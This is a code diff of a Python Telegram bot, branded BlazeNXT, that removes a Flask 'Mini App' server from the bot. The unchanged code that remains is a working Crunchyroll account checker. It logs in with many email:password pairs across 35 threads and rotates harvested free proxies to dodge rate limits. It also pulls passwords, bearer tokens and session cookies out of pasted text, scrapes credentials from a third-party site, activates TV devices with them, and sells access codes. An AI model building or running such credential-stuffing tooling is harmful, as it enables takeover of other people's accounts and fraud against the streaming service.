@@ -86,16 +86,7 @@ try:
 except ImportError:
     SOCKS5_OK = False
 
-# Mini App server (Flask) — optional, for Railway same-service hosting
-try:
-    from flask import Flask, request, jsonify, send_from_directory
-    from flask_cors import CORS
-    FLASK_OK = True
-except ImportError:
-    Flask = None
-    CORS = None
-    FLASK_OK = False
-
+# Mini App removed — Crunchyroll single checker only
 
 # ===================== CONFIG (env-driven) =====================
 def _load_dotenv() -> None:
@@ -120,13 +111,11 @@ def _load_dotenv() -> None:
     except OSError:
         pass
 
-
 def _env(name: str, default: str = "") -> str:
     v = os.getenv(name)
     if v is None or str(v).strip() == "":
         return default
     return str(v).strip()
-
 
 _load_dotenv()
 
@@ -172,8 +161,6 @@ DATA_DIR = Path(_env("DATA_DIR", "data"))
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 
 # Mini App config
-MINI_APP_URL = _env("MINI_APP_URL", "") or _env("WEBAPP_URL", "")
-MINI_APP_PATH = Path(__file__).resolve().parent / "miniapp"
 PORT = int(_env("PORT", "8000") or 8000)
 
 THREADS = max(1, int(_env("THREADS", "35")))
@@ -192,12 +179,10 @@ START_TIME = time.time()
 CHECKS_DONE = 0
 CHECKS_LOCK = threading.Lock()
 
-
 def bump_checks(n: int) -> None:
     global CHECKS_DONE
     with CHECKS_LOCK:
         CHECKS_DONE += n
-
 
 def uptime() -> str:
     s = int(time.time() - START_TIME)
@@ -212,7 +197,6 @@ def uptime() -> str:
     parts.append(f"{m}m {sec}s")
     return " ".join(parts)
 
-
 def _fmt_duration(sec: float) -> str:
     """Format seconds as '1m 10s' or '192m 18s' like BlazeNXT."""
     sec = int(sec)
@@ -224,12 +208,10 @@ def _fmt_duration(sec: float) -> str:
         return f"{h}h {m}m {s}s"
     return f"{m}m {s}s"
 
-
 def _fmt_cpm(processed: int, elapsed: float) -> int:
     if elapsed <= 0 or processed <= 0:
         return 0
     return int(processed / elapsed * 60)
-
 
 def _fmt_eta(total: int, processed: int, cpm: int) -> str:
     if cpm <= 0 or total <= processed:
@@ -238,14 +220,12 @@ def _fmt_eta(total: int, processed: int, cpm: int) -> str:
     eta_sec = int(remaining * 60 / cpm)
     return _fmt_duration(eta_sec)
 
-
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
     handlers=[logging.StreamHandler(sys.stdout)],
 )
 logger = logging.getLogger("CrunchyBot")
-
 
 # ===================== SMALL HELPERS =====================
 def esc(v) -> str:
@@ -254,10 +234,8 @@ def esc(v) -> str:
         return "N/A"
     return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
-
 def now_utc() -> datetime:
     return datetime.now(timezone.utc)
-
 
 def parse_iso(s) -> Optional[datetime]:
     if not s:
@@ -270,12 +248,10 @@ def parse_iso(s) -> Optional[datetime]:
     except (ValueError, TypeError):
         return None
 
-
 def fmt_dt(dt: Optional[datetime]) -> str:
     if not dt:
         return "N/A"
     return dt.astimezone(timezone.utc).strftime("%d-%m-%Y %H:%M UTC")
-
 
 def days_left_until(iso_date: str) -> str:
     if not iso_date:
@@ -285,16 +261,13 @@ def days_left_until(iso_date: str) -> str:
         return "N/A"
     return str(max(0, (dt - now_utc()).days))
 
-
 def generate_code() -> str:
     chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
     return "".join(random.choice(chars) for _ in range(12))
 
-
 def _clean_err(e) -> str:
     """Collapse newlines/whitespace from exception strings for tidy output."""
     return " ".join(str(e).split())[:60]
-
 
 def flag_emoji(cc) -> str:
     """Country code -> flag emoji (IN -> 🇮)."""
@@ -302,7 +275,6 @@ def flag_emoji(cc) -> str:
     if len(cc) != 2 or not cc.isalpha():
         return ""
     return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)
-
 
 # ===================== CRUNCHYROLL API =====================
 API_HOST = "https://beta-api.crunchyroll.com"
@@ -373,7 +345,6 @@ COUNTRY_MAP = {
 
 _tls = threading.local()
 
-
 def get_session() -> requests.Session:
     """Thread-local session with sane connection pooling."""
     s = getattr(_tls, "s", None)
@@ -384,7 +355,6 @@ def get_session() -> requests.Session:
         _tls.s = s
     return s
 
-
 def _req(session, method, url, proxy, **kw):
     """Request with proxy -> direct fallback (dead proxy must never kill a check)."""
     try:
@@ -393,7 +363,6 @@ def _req(session, method, url, proxy, **kw):
         if proxy:
             return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
         raise
-
 
 def _blank_data(user: str) -> dict:
     return {
@@ -408,7 +377,6 @@ def _blank_data(user: str) -> dict:
         "payment_method": "", "benefits": "", "checked_at": "",
         "proxy_used": "", "response_time": "",
     }
-
 
 # ---------------- App-API login (Baron flow) ----------------
 def app_login(user: str, pw: str, proxy: Optional[dict] = None):
@@ -451,7 +419,6 @@ def app_login(user: str, pw: str, proxy: Optional[dict] = None):
     if r.status_code != 200 or not isinstance(j, dict) or not j.get("access_token"):
         return None, "no token"
     return j, "ok"
-
 
 # ---------------- App-API account check (the HITTER) ----------------
 def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
@@ -598,7 +565,6 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
             pass
     return "hit", d
 
-
 def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 2):
     """Baron-style rate-limit retry: short backoff, then give up as 'rate'."""
     st, d = check_account_app(user, pw, proxy)
@@ -608,7 +574,6 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
         st, d = check_account_app(user, pw, proxy)
         i += 1
     return st, d
-
 
 # ---------------- Token / cookie checks (web flow) ----------------
 def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
@@ -640,7 +605,6 @@ def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
         return None, (j or {}).get("error") or (j or {}).get("code") or f"http_{r.status_code}"
     return j, ""
 
-
 def cr_me(bearer: str, proxy: Optional[dict] = None):
     s = get_session()
     try:
@@ -657,7 +621,6 @@ def cr_me(bearer: str, proxy: Optional[dict] = None):
         return r.json(), ""
     except ValueError:
         return None, "bad_json"
-
 
 def cr_subscriptions(account_id, bearer: str, proxy: Optional[dict] = None):
     if not account_id:
@@ -676,7 +639,6 @@ def cr_subscriptions(account_id, bearer: str, proxy: Optional[dict] = None):
     except ValueError:
         return None
 
-
 def cr_profiles(bearer: str, proxy: Optional[dict] = None):
     s = get_session()
     try:
@@ -692,7 +654,6 @@ def cr_profiles(bearer: str, proxy: Optional[dict] = None):
     except ValueError:
         return None
 
-
 def is_token_expired(token: str) -> bool:
     """Cheap local JWT expiry check (saves API calls)."""
     try:
@@ -705,7 +666,6 @@ def is_token_expired(token: str) -> bool:
         return bool(exp and int(exp) < time.time())
     except Exception:
         return False
-
 
 def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
     """Web-flow check from an access token. Returns (st, data)."""
@@ -765,7 +725,6 @@ def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
         d["payment"] = pay.get("name") or ""
     return ("hit" if premium else "free"), d
 
-
 def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
     """Check one credential of any type. Returns {"st": hit/free/bad/rate/err/2fa, "data": {...}}."""
     t = cred.get("type")
@@ -787,7 +746,6 @@ def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
     except Exception as e:  # one bad cred must never kill the run
         return {"st": "err", "data": dict(_blank_data(""), info=_clean_err(e))}
     return {"st": "err", "data": dict(_blank_data(""), info="unknown_type")}
-
 
 def activate_tv(bearer: str, code: str):
     """TV device activation (the cc2.py flow). Tries both API hosts."""
@@ -818,7 +776,6 @@ def activate_tv(bearer: str, code: str):
             last_err = f"network: {_clean_err(e)}"
     return False, last_err
 
-
 # ===================== PROXY POOL =====================
 PROXY_SOURCES = [
     "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
@@ -846,18 +803,15 @@ _refresh_busy = threading.Lock()
 LAST_PROXY_HARVEST = 0.0
 POOL_FILE = DATA_DIR / "proxies_pool.txt"
 
-
 def proxy_count() -> int:
     with PROXY_LOCK:
         return len(LIVE_PROXIES)
-
 
 def get_random_proxy() -> Optional[dict]:
     with PROXY_LOCK:
         if LIVE_PROXIES:
             return random.choice(LIVE_PROXIES)
     return None
-
 
 def harvest_proxies() -> List[str]:
     raw = set()
@@ -879,7 +833,6 @@ def harvest_proxies() -> List[str]:
             continue
     return list(raw)
 
-
 def test_one_proxy(proxy_str: str) -> Optional[dict]:
     """proxy_str = host:port. Tries http, then socks5 (if PySocks available)."""
     schemes = ["http"]
@@ -897,7 +850,6 @@ def test_one_proxy(proxy_str: str) -> Optional[dict]:
                 continue
     return None
 
-
 def test_proxy_url(proxy_url: str) -> Optional[dict]:
     """proxy_url = full url (scheme://[user:pass@]host:port)."""
     for url in PROXY_TEST_URLS:
@@ -909,7 +861,6 @@ def test_proxy_url(proxy_url: str) -> Optional[dict]:
         except requests.RequestException:
             continue
     return None
-
 
 def refresh_live_proxies(force: bool = False) -> None:
     global LIVE_PROXIES, LAST_PROXY_HARVEST
@@ -947,13 +898,11 @@ def refresh_live_proxies(force: bool = False) -> None:
     finally:
         _refresh_busy.release()
 
-
 def ensure_proxies() -> None:
     if proxy_count() == 0:
         _load_pool_into_live()
         if proxy_count() == 0:
             refresh_live_proxies(force=True)
-
 
 def _proxy_loop() -> None:
     while True:
@@ -962,7 +911,6 @@ def _proxy_loop() -> None:
         except Exception as e:
             logger.warning("Proxy loop error: %s", e)
         time.sleep(PROXY_REFRESH_MINUTES * 60)
-
 
 # ---------------- Custom proxy pool (user-added, persistent) ----------------
 def pool_load() -> List[str]:
@@ -973,17 +921,14 @@ def pool_load() -> List[str]:
         pass
     return []
 
-
 def pool_save(items: List[str]):
     try:
         POOL_FILE.write_text("\n".join(items) + ("\n" if items else ""), encoding="utf-8")
     except OSError as e:
         logger.warning("Pool save failed: %s", e)
 
-
 def pool_size() -> int:
     return len(pool_load())
-
 
 def normalize_proxy(line: str) -> Optional[str]:
     """Accepts host:port | user:pass:host:port | scheme://... -> full url."""
@@ -999,7 +944,6 @@ def normalize_proxy(line: str) -> Optional[str]:
         return f"http://{parts[0]}:{parts[1]}"
     return None
 
-
 def _merge_live(items: List[dict]):
     with PROXY_LOCK:
         have = {p.get("https") for p in LIVE_PROXIES}
@@ -1008,12 +952,10 @@ def _merge_live(items: List[dict]):
                 LIVE_PROXIES.append(p)
                 have.add(p.get("https"))
 
-
 def _load_pool_into_live():
     items = pool_load()
     if items:
         _merge_live([{"http": p, "https": p} for p in items])
-
 
 def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
     """Add user-pasted proxies. Returns (added, invalid)."""
@@ -1039,7 +981,6 @@ def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
             _merge_live([{"http": p, "https": p} for p in existing])
     return added, invalid
 
-
 def _background_test_pool():
     """Auto-check: background-test the whole custom pool, keep the live ones.
 
@@ -1056,14 +997,12 @@ def _background_test_pool():
         _merge_live(tested)
     logger.info("Pool auto-check done: %d live", len(tested))
 
-
 def clear_pool():
     global LAST_PROXY_HARVEST
     pool_save([])
     with PROXY_LOCK:
         LIVE_PROXIES.clear()
         LAST_PROXY_HARVEST = time.time()  # don't let the loop refill immediately
-
 
 # ===================== CREDENTIAL EXTRACTION =====================
 EMAIL_PASS_RE = re.compile(
@@ -1074,7 +1013,6 @@ LABELED_TOKEN_RE = re.compile(
     r"(?:access[_-]?token|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.+/=]{20,})", re.I
 )
 ETP_RT_RE = re.compile(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", re.I)
-
 
 def extract_credentials(text: str) -> List[dict]:
     """Pull email:pass lines, JWT/Bearer tokens and etp_rt cookies out of any text."""
@@ -1112,7 +1050,6 @@ def extract_credentials(text: str) -> List[dict]:
             creds.append({"type": "cookie", "value": val})
 
     return creds
-
 
 # ===================== CHECKER ENGINE =====================
 def run_check(text: str, reporter=None) -> dict:
@@ -1211,12 +1148,10 @@ def run_check(text: str, reporter=None) -> dict:
             pass
     return results
 
-
 def _cred_value(cred: dict) -> str:
     if cred["type"] == "email":
         return f"{cred['value']}:{cred.get('password', '')}"
     return cred["value"]
-
 
 def make_export(accounts: List[dict], fmt: str = "txt") -> str:
     fd, path = tempfile.mkstemp(suffix=f".{fmt}", prefix="crunchy_")
@@ -1251,11 +1186,9 @@ def make_export(accounts: List[dict], fmt: str = "txt") -> str:
                 )
     return str(p)
 
-
 # ===================== OXAAM SCRAPER (from cc2.py, bug-fixed) =====================
 OXAAM_BASE = "https://www.oxaam.com/"
 OXAAM_FREE = "https://www.oxaam.com/freeservice.php"
-
 
 def _oxaam_headers() -> dict:
     return {
@@ -1267,7 +1200,6 @@ def _oxaam_headers() -> dict:
         "Referer": "https://www.oxaam.com/",
     }
 
-
 def _find_password(block: str) -> Optional[str]:
     m = re.search(r"[Pp]ass(?:word)?\s*[:=]\s*([^\s<>\"'`,;]{6,})", block)
     if m:
@@ -1276,7 +1208,6 @@ def _find_password(block: str) -> Optional[str]:
     if m:
         return m.group(1)
     return None
-
 
 def parse_oxaam(html: str):
     """Robust credential extraction — no NameErrors, no magic line numbers."""
@@ -1302,7 +1233,6 @@ def parse_oxaam(html: str):
     if m:
         return m.group(1), m.group(2)
     return None, None
-
 
 def oxaam_fetch(proxy: dict | None = None):
     """Register on the site and pull a fresh Crunchyroll credential. Returns (email, password)."""
@@ -1377,8 +1307,6 @@ def oxaam_fetch(proxy: dict | None = None):
                 logger.warning("Oxaam unexpected %s: %s", base, e)
             _t.sleep(1.2)
     return None, None
-
-
 
 # ===================== PERSISTENT STORE (codes + grants + settings) =====================
 class Store:
@@ -1485,15 +1413,12 @@ class Store:
                 if (parse_iso(d.get("expiry")) or datetime.min.replace(tzinfo=timezone.utc)) > now
             )
 
-
 STORE: Optional[Store] = None
-
 
 # ===================== PROGRESS (thread-safe, BlazeNXT PREMIUM bar) =====================
 def _bar(pct: int, width: int = 20) -> str:
     filled = int(pct / 100 * width)
     return "█" * filled + "░" * (width - filled)
-
 
 def _live_feed_block(res: dict) -> str:
     feed = res.get("live_feed") or []
@@ -1502,7 +1427,6 @@ def _live_feed_block(res: dict) -> str:
     # show last 3
     last = feed[-3:]
     return "\n".join(f"  {esc(x)}" for x in last)
-
 
 def progress_text(res: dict) -> str:
     total = res.get("total") or 0
@@ -1542,7 +1466,6 @@ def progress_text(res: dict) -> str:
     )
     return premium
 
-
 class ProgressReporter:
     """Updates a Telegram message from worker threads without blocking."""
 
@@ -1580,7 +1503,6 @@ class ProgressReporter:
                 pass
         self.tasks.clear()
 
-
 # ===================== FORMATTING — BlazeNXT PREMIUM =====================
 def access_denied_html() -> str:
     return (
@@ -1592,7 +1514,6 @@ def access_denied_html() -> str:
         "━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
     )
-
 
 def hit_card(entry: dict) -> str:
     """⭐ Full detail card for one hit — BlazeNXT DETAILED style."""
@@ -1637,7 +1558,6 @@ def hit_card(entry: dict) -> str:
     L.append("━━━━━━━━━━━━━━━━━━━━━")
     L.append("🔥 <b>BlazeNXT</b>")
     return "\n".join(L)
-
 
 def summary_text(res: dict) -> str:
     # Keep legacy lines for compat, wrap in premium header/footer
@@ -1693,7 +1613,6 @@ def summary_text(res: dict) -> str:
         "🔥 <b>BlazeNXT</b>"
     )
 
-
 def status_text() -> str:
     ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
     return (
@@ -1712,7 +1631,6 @@ def status_text() -> str:
         "━━━━━━━━━━━━━━━━━━━━━\n"
         "🔥 <b>BlazeNXT</b>"
     )
-
 
 def help_text() -> str:
     return (
@@ -1734,7 +1652,6 @@ def help_text() -> str:
         f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
     )
 
-
 def welcome_premium_text(uid: int, name: str) -> str:
     has, exp = STORE.has_access(uid) if STORE else (False, None)
     if is_admin(uid):
@@ -1754,7 +1671,6 @@ def welcome_premium_text(uid: int, name: str) -> str:
         "━━━━━━━━━━━━━━━━━━━━━\n"
         "👇 <i>Select an action below</i>"
     )
-
 
 # ===================== BUTTON MENUS (Bot API 9.4 colored JSON) =====================
 # style: "primary" (blue) | "success" (green) | "danger" (red)
@@ -1809,8 +1725,6 @@ def _premium_icon(label: str) -> str | None:
 BLAZENXT_RIBBON = f'<tg-emoji emoji-id="{PREMIUM_EMOJI["🎀"]}">🎀</tg-emoji>'
 BLAZENXT_BRAND = f'<tg-emoji emoji-id="{PREMIUM_EMOJI["🔥"]}">🔥</tg-emoji> <b>BlazeNXT</b> {BLAZENXT_RIBBON}'
 
-
-
 def _build_kb(rows) -> InlineKeyboardMarkup:
     """rows: list of rows; each row = list of (label, cb) or (label, cb, style) or (label, cb, style, icon)."""
     use_icon = _CAPS["icon"] is not False
@@ -1835,7 +1749,6 @@ def _build_kb(rows) -> InlineKeyboardMarkup:
             btns.append(InlineKeyboardButton(label, callback_data=cb, **kwargs))
         data.append(btns)
     return InlineKeyboardMarkup(data)
-
 
 async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
     """Send/edit a message with a button menu. Graceful degradation of 9.4 fields."""
@@ -1868,14 +1781,11 @@ async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
             return False
     return False
 
-
 async def reply_menu(msg, text, rows):
     return await _send_menu(msg, text, rows, edit=False)
 
-
 async def edit_menu(msg, text, rows):
     return await _send_menu(msg, text, rows, edit=True)
-
 
 # ===================== REPLY KEYBOARD (Hybrid) =====================
 # Hybrid: main menus use ReplyKeyboardMarkup (persistent bottom keyboard),
@@ -1929,16 +1839,10 @@ def _build_reply_kb(rows, resize=True, one_time=False) -> ReplyKeyboardMarkup:
     return ReplyKeyboardMarkup(kb, resize_keyboard=resize, one_time_keyboard=one_time)
 
 def main_reply_kb(is_owner: bool) -> ReplyKeyboardMarkup:
-    _mini_url = ""
-    try:
-        _mini_url = _get_miniapp_url() if "_get_miniapp_url" in globals() else ""
-    except Exception:
-        _mini_url = ""
-    # Base rows — last element of Mini App tuple is web_app url (handled by _build_reply_kb)
+# Base rows — last element of Mini App tuple is web_app url (handled by _build_reply_kb)
     rows = [
         [("💎 Check Account", "success"), ("📂 Check File", "primary")],
         [("✅ My Access", "success"), ("📖 How To", "primary")],
-        [("🌐 Mini App", "primary", "5447602197439218445", _mini_url if _mini_url else None)],
     ]
     if is_owner:
         rows.append([("👑 Owner Panel", "success")])
@@ -1967,7 +1871,6 @@ def gen_reply_kb() -> ReplyKeyboardMarkup:
 REPLY_TEXT_MAP = {
     "💎 Check Account": "check",
     "📂 Check File": "file",
-    "🌐 Mini App": "miniapp",
     "🎛 Output Mode": "mode",
     "✅ My Access": "myaccess",
     "📖 How To": "help",
@@ -2021,26 +1924,21 @@ async def _edit_or_send_reply(msg, text: str, reply_kb: ReplyKeyboardMarkup):
     # So we just send new
     return await _send_reply_menu(msg, text, reply_kb)
 
-
 # ===================== PENDING INPUT STATE (button -> typed input) =====================
 PENDING: Dict[int, dict] = {}
 PENDING_LOCK = threading.Lock()
-
 
 def set_pending(uid: int, kind: str, **kw):
     with PENDING_LOCK:
         PENDING[uid] = {"kind": kind, **kw}
 
-
 def get_pending(uid: int):
     with PENDING_LOCK:
         return PENDING.get(uid)
 
-
 def clear_pending(uid: int):
     with PENDING_LOCK:
         PENDING.pop(uid, None)
-
 
 def _has_access(uid: int) -> bool:
     # access = admin OR has redeem
@@ -2048,7 +1946,6 @@ def _has_access(uid: int) -> bool:
 
 def _is_owner(uid: int, username: str = None) -> bool:
     return is_admin(uid, username)
-
 
 # ===================== MENU DEFINITIONS — BlazeNXT =====================
 # Clean Crunchyroll-only menu (no AIO grid) — BlazeNXT
@@ -2084,7 +1981,6 @@ def menu_main(uid: int):
     rows = [[("🎫 Redeem Access Code", "redeem_flow", "success")]]
     return text, rows
 
-
 def menu_owner():
     ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
     # Premium header already wrapped via _premium_wrap
@@ -2107,14 +2003,12 @@ def menu_owner():
     ]
     return header, rows
 
-
 # ===================== TV / OXAAM WORKERS =====================
 def _tv_do(email, pw, code):
     j, st = app_login(email, pw)
     if not j:
         return False, f"login_failed ({st})"
     return activate_tv(j["access_token"], code)
-
 
 def _oxaam_do():
     # Use proxy for oxaam fetch as well (helps on Railway)
@@ -2132,7 +2026,6 @@ def _oxaam_do():
     except Exception as e:
         r = {"st": "err", "data": {"info": str(e)}}
     return email, pw, r
-
 
 def _oxaam_report(email, pw, res) -> str:
     head = f"🔐 <code>{esc(email)}:{esc(pw)}</code>\n\n"
@@ -2156,7 +2049,6 @@ def _oxaam_report(email, pw, res) -> str:
         )
     return head + f"⚠️ Extracted, but check result: <code>{esc(st)}</code> {esc(info)}\n🔥 <b>BlazeNXT</b> 🎀"
 
-
 # ===================== HIT CARDS (flood-safe) =====================
 async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> int:
     sent = 0
@@ -2175,7 +2067,6 @@ async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> 
             except Exception:
                 return sent
     return sent
-
 
 # ===================== CHECK RUNNER — BlazeNXT PREMIUM =====================
 async def _run_and_report(msg, uid: int, text: str):
@@ -2234,7 +2125,6 @@ async def _run_and_report(msg, uid: int, text: str):
                          [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                           [("⬅️ Main Menu", "menu", "danger")]])
 
-
 # ===================== HANDLERS (100% button flow) =====================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -2267,7 +2157,6 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await reply_menu(msg, text, rows)
 
-
 async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Catch-all for any typed /command -> steer the user to the buttons."""
     user = update.effective_user
@@ -2276,7 +2165,6 @@ async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     text, rows = menu_main(user.id)
     await reply_menu(msg, "🔘 This bot is 100% button-driven — pick an option below 👇\n\n" + text, rows)
-
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -2288,29 +2176,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Hybrid ReplyKeyboard handling: map button text to callback actions
     # Do this BEFORE pending, so Back/Menu buttons work even while pending
     reply_action = REPLY_TEXT_MAP.get(text)
-    if reply_action == "miniapp":
-        url = _get_miniapp_url() if "_get_miniapp_url" in globals() else ""
-        if not url:
-            kb = InlineKeyboardMarkup([[InlineKeyboardButton("📖 How To", callback_data="help")]])
-            await msg.reply_text(
-                "🌐 <b>Mini App</b>\n\n"
-                "Mini App URL not configured yet.\n"
-                "Set <code>MINI_APP_URL=https://YOUR-APP.up.railway.app</code> in Railway Variables and redeploy.\n"
-                "The app is served on <code>PORT</code> from the same service.",
-                parse_mode=ParseMode.HTML, reply_markup=kb
-            )
-            return
-        try:
-            from telegram import WebAppInfo as _WAI
-            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🌐 Open Mini App", web_app=_WAI(url=url))]])
-        except Exception:
-            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🌐 Open Mini App", url=url)]])
-        await msg.reply_text(
-            f"🌐 <b>BlazeNXT Mini App</b>\n\nTap to open:\n{url}\n\n"
-            "Also available from the Telegram menu button (🌐).",
-            parse_mode=ParseMode.HTML, reply_markup=kb
-        )
-        return
+
     if reply_action:
         # Clear pending if user pressed a main menu button (acts like on_button)
         # But keep pending for some? For now clear pending and handle as button
@@ -2608,7 +2474,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     mtext, rows = menu_main(uid)
     await reply_menu(msg, mtext, rows)
 
-
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     msg = update.effective_message
@@ -2655,7 +2520,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await note.edit_text("❌ File is empty.")
         return
     await _run_and_report(msg, uid, text)
-
 
 # AIO service names for "coming soon" messages
 _SVC_NAMES = {
@@ -2885,7 +2749,6 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Send me <code>EMAIL:PASS</code> of the account.",
             [[("⬅️ Back", "opanel", "danger")]])
 
-
 async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error("Unhandled error: %s", context.error, exc_info=context.error)
     try:
@@ -2896,430 +2759,7 @@ async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         pass
 
-
 # ===================== ENTRYPOINT =====================
-
-# ──────────────────────────────── Mini App Server ───────────────────────────────
-# Serves ./miniapp/ and exposes /api/* reusing bot's STORE + checker
-
-_miniapp_app = None
-_miniapp_started = False
-
-def _get_miniapp_url() -> str:
-    if MINI_APP_URL:
-        return MINI_APP_URL.rstrip("/")
-    # Railway public domain fallback
-    dom = _env("RAILWAY_PUBLIC_DOMAIN", "") or _env("RAILWAY_STATIC_URL", "")
-    if dom:
-        dom = dom.replace("https://","").replace("http://","").rstrip("/")
-        return f"https://{dom}"
-    return ""
-
-def _miniapp_status_dict():
-    import time as _t
-    try:
-        up = int(_t.time() - max(getattr(STORE,"started_at", _t.time()), 1)) if getattr(STORE,"started_at",0) else 0
-    except Exception:
-        up = 0
-    # proxy counts from globals LIVE_PROXIES + pool file
-    try:
-        _pool_list = pool_load() if "pool_load" in globals() else []
-    except Exception:
-        _pool_list = []
-    try:
-        _live = proxy_count() if "proxy_count" in globals() else len(LIVE_PROXIES)
-    except Exception:
-        _live = len(LIVE_PROXIES) if "LIVE_PROXIES" in globals() else 0
-    # auto-check setting
-    try:
-        _auto = STORE.get_setting("auto_check", True) if STORE else True
-    except Exception:
-        _auto = True
-    try:
-        _users = len(getattr(STORE, "users", {})) if STORE else 0
-    except Exception:
-        _users = 0
-    return {
-        "ok": True,
-        "blazenxt": "BlazeNXT",
-        "version": "v10",
-        "uptime": f"{up//3600}h {(up%3600)//60}m {up%60}s",
-        "uptime_s": up,
-        "started_at": getattr(STORE,"started_at",0) if STORE else 0,
-        "pool": len(_pool_list),
-        "live": _live,
-        "live_proxies": _live,
-        "auto_check": bool(_auto),
-        "users": _users,
-        "pool_proxies": len(_pool_list),
-        "miniapp_url": _get_miniapp_url(),
-        "bot": OWNER_USERNAME or "",
-    }
-
-def _build_flask_app():
-    global _miniapp_app
-    if _miniapp_app is not None:
-        return _miniapp_app
-    if not FLASK_OK or Flask is None:
-        return None
-    app = Flask(__name__, static_folder=str(MINI_APP_PATH), static_url_path="")
-    if CORS:
-        CORS(app)
-    else:
-        # minimal CORS fallback
-        @app.after_request
-        def _cors(resp):
-            resp.headers["Access-Control-Allow-Origin"] = "*"
-            resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
-            resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
-            return resp
-
-    @app.get("/health")
-    def _health():
-        return jsonify({"ok": True, "blazenxt": "alive"}), 200
-
-    @app.get("/")
-    def _idx():
-        p = MINI_APP_PATH / "index.html"
-        if p.exists():
-            return send_from_directory(str(MINI_APP_PATH), "index.html")
-        return "Mini App not found", 404
-
-    @app.get("/style.css")
-    def _css():
-        return send_from_directory(str(MINI_APP_PATH), "style.css")
-
-    @app.get("/app.js")
-    def _js():
-        return send_from_directory(str(MINI_APP_PATH), "app.js")
-
-    @app.get("/api/status")
-    def _api_status():
-        return jsonify(_miniapp_status_dict())
-
-    @app.get("/api/proxy/status")
-    def _api_proxy_status():
-        return jsonify(_miniapp_status_dict())
-
-    @app.post("/api/proxy/add")
-    def _api_proxy_add():
-        try:
-            data = request.get_json(force=True) or {}
-            lines = data.get("lines") or data.get("proxies") or []
-            if isinstance(lines, str):
-                lines = lines.splitlines()
-        except Exception:
-            lines = []
-        # Use the real helper: add_proxies_to_pool
-        try:
-            ac = STORE.get_setting("auto_check", True) if STORE else True
-        except Exception:
-            ac = True
-        try:
-            added, invalid = add_proxies_to_pool(lines, ac) if "add_proxies_to_pool" in globals() else (0, len(lines))
-        except Exception as e:
-            return jsonify({"ok": False, "error": str(e)}), 500
-        try:
-            pool_n = len(pool_load()) if "pool_load" in globals() else 0
-        except Exception:
-            pool_n = 0
-        return jsonify({"ok": True, "added": added, "invalid": invalid, "pool": pool_n})
-
-    @app.post("/api/proxy/clear")
-    def _api_proxy_clear():
-        try:
-            clear_pool() if "clear_pool" in globals() else None
-        except Exception as e:
-            return jsonify({"ok": False, "error": str(e)}), 500
-        return jsonify({"ok": True})
-
-    @app.post("/api/proxy/refresh")
-    def _api_proxy_refresh():
-        try:
-            import threading
-            if "refresh_live_proxies" in globals():
-                threading.Thread(target=lambda: refresh_live_proxies(True), daemon=True).start()
-        except Exception as e:
-            return jsonify({"ok": False, "error": str(e)}), 500
-        return jsonify({"ok": True, "msg": "refresh triggered"})
-
-    @app.post("/api/code/generate")
-    def _api_code_gen():
-        import time as _t, secrets, string
-        try:
-            body = request.get_json(force=True) or {}
-            hours = int(body.get("hours") or body.get("duration") or 24)
-        except Exception:
-            hours = 24
-        if hours not in (24,48,72):
-            hours = 24
-        # reuse STORE gen if exists, else local
-        code = ""
-        expiry = ""
-        try:
-            if hasattr(STORE, "gen_code"):
-                code = STORE.gen_code(hours)
-                # gen_code may return (code, expiry) or code
-                if isinstance(code, (list, tuple)):
-                    code, expiry = code[0], str(code[1]) if len(code)>1 else ""
-                else:
-                    expiry = _t.strftime("%Y-%m-%d %H:%M", _t.gmtime(_t.time()+hours*3600))
-            else:
